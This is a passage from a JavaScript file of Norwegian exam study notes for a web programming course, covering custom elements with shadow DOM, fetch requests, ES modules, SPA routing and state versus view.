        <button type="button">Remove</button>
    </div>\`;

class MessageList extends HTMLElement {
    #callbacks = new Map();                 // 1. private felter
    #list;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);      // kopi av templaten
        shadow.append(content);
        this.#list = shadow.getElementById("list");            // 2. finn elementene én gang
    }

    show(message) {                                            // 3. offentlig metode
        const content = rowtemplate.content.cloneNode(true);
        const elm = content.firstElementChild;
        elm.dataset.id = message.id;                           // data-id
        elm.querySelector(".author").textContent = message.author;
        elm.querySelector("button")
           .addEventListener("click", () => { this.#onremove(message.id) });
        this.#list.prepend(elm);                               // øverst (append = nederst)
    }

    remove(id) {
        const elm = this.#list.querySelector(\`[data-id="\${id}"]\`);
        if (elm !== null) elm.remove();
    }

    addremovecallback(callback) {                              // 4. callback-registrering
        const callbackid = Symbol("removecallback");
        this.#callbacks.set(callbackid, callback);
        return callbackid;
    }

    #onremove(id) {                                            // 5. privat hjelpemetode
        this.#callbacks.forEach(callback => callback(id));
    }
}
customElements.define('message-list', MessageList);
~~~
<h3>Når komponenten skal hente data (QuizTool v26, TaskView i obligen)</h3>
~~~javascript
connectedCallback() {                    // kjører når komponenten settes inn i dokumentet
    this.#fetchCount();
}

async #fetchCount() {
    try {
        const response = await fetch(\`\${this.#serviceurl}/count\`, { method: "GET" });
        const result = await response.json();
        if (result.responseStatus) {
            this.#countElm.textContent = result.count;
        }
    } catch (error) {
        console.log(error.message);
    }
}
~~~
<p>POST med data (som i obligen):</p>
~~~javascript
const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json; charset=utf-8" },
    body: JSON.stringify(task)
});
~~~
<h3>Det sensor trekker for</h3>
<ul><li>Bare kopiere koden fra oppgaveteksten gir 0 poeng.</li><li>Ikke bruke templatene fra oppgaven.</li><li>Utdatert JavaScript. Bruk <code>const</code>/<code>let</code>, <code>#private</code>, arrow functions og <code>async/await</code>.</li></ul>
<h3>Begrepene</h3>
<ul>
<li><code>customElements.define('x-y', XY)</code> – lager taggen og kobler den til klassen; hver bruk av taggen gir en ny instans.</li>
<li><code>connectedCallback</code> – satt inn i DOM. <code>disconnectedCallback</code> – fjernet fra DOM.</li>
<li><code>cloneNode(true)</code> – uten den flyttes innholdet ut av templaten, og neste instans blir tom.</li>
<li>Shadow DOM – eget, skjult DOM-tre. <code>open</code>: nås utenfra med <code>element.shadowRoot</code>. <code>closed</code>: ikke.</li>
<li><code>&lt;slot&gt;</code> – plassholder som fylles med innholdet i taggen.</li>
</ul>` },

{ id: "jsmod", group: "js", title: "Moduler, SPA, routing og state/view",
  html: `
<h3>Moduler</h3>
~~~javascript
// js/modules/util.js
export default {
    metrestofeet(metres) { /* ... */ }
}

// js/main.js
import util from './modules/util.js';
console.log(util.metrestofeet(10));
~~~
<p><code>export default</code>: det som importeres når du ikke navngir hva du vil ha. Maks én per modul.</p>
<p>Fra obligen din (index.html):</p>
~~~html
<head>
    <script src="components/tasklist/taskview/TaskView.js" type="module"></script>
</head>
~~~
<ul>
<li><b>Hvor?</b> I <code>&lt;head&gt;</code>. <code>type="module"</code> er deferred, så scriptet lastes ned parallelt med HTML-en og kjører når dokumentet er ferdig lest. Begrunn med <b>ytelse</b> (sensor: bare «lesbarhet» gir 40 %).</li>
<li><b>type="module" betyr:</b> kan bruke import/export · deferred (DOM er klar når koden kjører) · strict mode · variabler er lokale for modulen.</li>
</ul>
<h3>SPA og routing</h3>
<p><b>SPA:</b> én HTML-side; JavaScript henter data og bytter visning uten å laste ny side. <b>MPA:</b> ny side fra serveren ved hver navigasjon.</p>
<p><b>Routing:</b> hver visning får sin egen URL, så bokmerker og tilbake-knappen virker.</p>
~~~javascript
// Endrer du bare delen etter # lastes ingen ny side, men hashchange fyrer
window.addEventListener("hashchange", () => {
    if (location.hash === "#courses") showCourses();
    else showHome();
});
~~~
<p>Alternativ uten #: stopp sidelasting med <code>preventDefault</code> og bruk <code>history.pushState</code>.</p>
<h3>State og view</h3>
<p><b>State</b> = dataene i JavaScript. <b>View</b> = det brukeren ser (DOM). Rammeverk holder dem synkronisert: endres state, oppdateres view automatisk.</p>
~~~javascript
const [count, setCount] = useState(0);        // React
// setCount(count + 1) endrer state -> React tegner viewet på nytt
~~~
<h3>Egenskaper på objekter (v24)</h3>
~~~javascript
Object.defineProperty(student, "surename", { writable: false });   // kan ikke endres
~~~
<p><b>Enumerable</b> = egenskapen blir med når du looper gjennom objektet.</p>` }
];
